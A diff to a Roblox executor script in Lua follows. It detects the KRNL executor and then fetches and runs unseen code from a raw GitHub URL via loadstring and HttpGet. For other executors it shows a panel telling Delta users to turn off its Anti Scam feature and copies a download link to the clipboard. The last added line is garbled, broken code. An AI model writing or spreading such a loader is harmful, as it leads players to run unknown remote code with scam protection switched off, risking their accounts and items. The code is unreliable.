@@ -67,45 +67,46 @@ local function isUsingKRNL()
 end
 
 wait(3)
+
 if isUsingKRNL() then
 	CombinedLoading.Text = "⌛ KRNL Detected. Launching..."
 	wait(1)
+	loading = false
+	LoadingGui:Destroy()
+
+	-- Load KRNL script
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeMcdz/Petmuta/refs/heads/main/Mayloading"))()
+	return -- STOP script here if KRNL is detected
 else
 	CombinedLoading.Text = "❌ Executor not supported. KRNL required."
 	wait(2)
+	loading = false
+	LoadingGui:Destroy()
 end
 
-loading = false
-wait(1)
-LoadingGui:Destroy()
-
---// DeltaWarningDashboard GUI
+--// DELTA WARNING GUI
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "DeltaWarningDashboard"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.IgnoreGuiInset = true
 ScreenGui.Parent = PlayerGui
 
---// Main Frame
 local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0.5, 0, 0.5, 0) -- Increase height from 0.4 to 0.5
+Frame.Size = UDim2.new(0.5, 0, 0.5, 0)
 Frame.Position = UDim2.new(0.25, 0, 0.3, 0)
 Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 Frame.BorderSizePixel = 4
-Frame.BackgroundTransparency = 0
 Frame.Name = "WarningBox"
 Frame.Parent = ScreenGui
 
---// Rainbow Border Effect
+-- Rainbow Border
 local rainbow = 0
 RunService.RenderStepped:Connect(function()
 	rainbow = (rainbow + 1) % 360
-	local color = Color3.fromHSV(rainbow / 360, 1, 1)
-	Frame.BorderColor3 = color
+	Frame.BorderColor3 = Color3.fromHSV(rainbow / 360, 1, 1)
 end)
 
---// Warning Icon
+-- Warning Icon
 local Icon = Instance.new("TextLabel")
 Icon.Size = UDim2.new(0.15, 0, 1, 0)
 Icon.Position = UDim2.new(0, 0, 0, 0)
@@ -116,7 +117,7 @@ Icon.TextScaled = true
 Icon.TextColor3 = Color3.fromRGB(255, 200, 0)
 Icon.Parent = Frame
 
---// Main Warning Text
+-- Warning Text
 local TextLabel = Instance.new("TextLabel")
 TextLabel.Size = UDim2.new(0.85, -20, 0.45, 0)
 TextLabel.Position = UDim2.new(0.15, 10, 0, 0)
@@ -128,7 +129,7 @@ TextLabel.Font = Enum.Font.SourceSansBold
 TextLabel.Text = "Currently not working on Delta.\nUse KRNL or turn off Anti Scam on Delta."
 TextLabel.Parent = Frame
 
---// Download KRNL Button
+-- Download Button
 local DownloadButton = Instance.new("TextButton")
 DownloadButton.Size = UDim2.new(0.5, 0, 0.15, 0)
 DownloadButton.Position = UDim2.new(0.25, 0, 0.5, 0)
@@ -138,13 +139,12 @@ DownloadButton.TextColor3 = Color3.new(1, 1, 1)
 DownloadButton.TextScaled = true
 DownloadButton.Font = Enum.Font.SourceSansBold
 DownloadButton.Parent = Frame
-
 DownloadButton.MouseButton1Click:Connect(function()
 	setclipboard("https://krnl.vip")
 	DownloadButton.Text = "Link copied to clipboard!"
 end)
 
---// Tutorial Button
+-- Tutorial Button
 local TutorialButton = Instance.new("TextButton")
 TutorialButton.Size = UDim2.new(0.5, 0, 0.15, 0)
 TutorialButton.Position = UDim2.new(0.25, 0, 0.7, 0)
@@ -155,7 +155,7 @@ TutorialButton.TextScaled = true
 TutorialButton.Font = Enum.Font.SourceSansBold
 TutorialButton.Parent = Frame
 
---// Tutorial Popup
+-- Tutorial Popup
 local TutorialPopup = Instance.new("Frame")
 TutorialPopup.Size = UDim2.new(0.6, 0, 0.6, 0)
 TutorialPopup.Position = UDim2.new(0.2, 0, 0.2, 0)
@@ -194,7 +194,7 @@ Image.Size = UDim2.new(1, -20, 0.55, 0)
 Image.Position = UDim2.new(0, 10, 0.35, 0)
 Image.BackgroundTransparency = 1
 Image.ScaleType = Enum.ScaleType.Fit
-Image.Image = "rbxassetid://PUT_IMAGE_ID_HERE" -- Replace this
+Image.Image = "rbxassetid://PUT_IMAGE_ID_HERE"
 Image.Parent = TutorialPopup
 
 TutorialButton.MouseButton1Click:Connect(function()
@@ -205,7 +205,7 @@ CloseTutorial.MouseButton1Click:Connect(function()
 	TutorialPopup.Visible = false
 end)
 
---// Player Profile
+-- Profile
 local ProfilePic = Instance.new("ImageLabel")
 ProfilePic.Size = UDim2.new(0, 60, 0, 60)
 ProfilePic.Position = UDim2.new(1, -70, 1, -70)
@@ -215,7 +215,7 @@ ProfilePic.Parent = Frame
 
 local NameLabel = Instance.new("TextLabel")
 NameLabel.Size = UDim2.new(1, 0, 0.3, 0)
-NameLabel.Position = UDim2.new(0, 0, -0.35, 0) -- Above the image
+NameLabel.Position = UDim2.new(0, 0, -0.35, 0)
 NameLabel.BackgroundTransparency = 1
 NameLabel.Text = LocalPlayer.DisplayName
 NameLabel.TextColor3 = Color3.new(1, 1, 1)
@@ -223,4 +223,4 @@ NameLabel.Font = Enum.Font.SourceSansBold
 NameLabel.TextScaled = true
 NameLabel.TextWrapped = true
 NameLabel.TextXAlignment = Enum.TextXAlignment.Center
-NameLabel.Parent = ProfilePic
+NameLabel.Parent = ProfilePicLoadingGui.ResetOnSpawn
